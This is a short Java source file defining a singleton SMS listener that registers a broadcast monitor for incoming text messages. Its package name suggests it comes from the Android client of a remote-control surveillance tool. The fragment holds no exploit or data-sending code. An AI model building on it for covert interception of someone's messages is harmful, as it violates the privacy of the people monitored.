package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Sms;

public class ListenerSms extends Listener<Sms> {
		/** The Constant TAG. */
		private static final String TAG = "SmsListener";

		private BroadcastMonitorSms smsReceiver;

		/** The singleton. */
		private volatile static ListenerSms singleton;

		/**
		 * Self.
		 * 
		 * @return the status
		 */
		public static ListenerSms self() {
			if (singleton == null) {
				synchronized (ListenerSms.class) {
					if (singleton == null) {
						singleton = new ListenerSms();
					}
				}
			}

			return singleton;
		}
		
		@Override
		protected void start() {
			registerSms();
		}

		@Override
		protected void stop() {
			
		}
		
		/**
		 * Register the SMS monitor.
		 */
		private void registerSms() {
			smsReceiver = new BroadcastMonitorSms();
		}
}
